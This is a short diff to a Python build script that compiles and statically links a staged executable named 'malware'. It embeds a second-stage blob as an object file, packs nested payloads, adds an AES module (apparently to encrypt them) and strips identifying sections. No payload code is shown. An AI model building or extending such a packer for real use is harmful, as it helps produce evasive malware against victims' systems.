@@ -82,8 +82,9 @@ os.system("objcopy -I binary -O elf64-x86-64 stage2 stage2.o")
 # Build stage 2, link with blob, strip, minify, etc
 # Stage 1 - pack nested payloads
 
-os.system("gcc -Wall -fPIC -Wextra -s -O4 -funroll-loops -c Stage1_processed.c -o malware.o")
-os.system("gcc -static malware.o stage2.o -o malware")
+os.system("gcc -Wall -Wextra -s -c aes.c -o aes.o")
+os.system("gcc -Wall -Wextra -s -O4 -funroll-loops -c Stage1_processed.c -o malware.o")
+os.system("gcc -static malware.o stage2.o aes.o -o malware")
 
 os.system("strip -R .comment malware")
 os.system("strip -R .note.gnu.property malware")
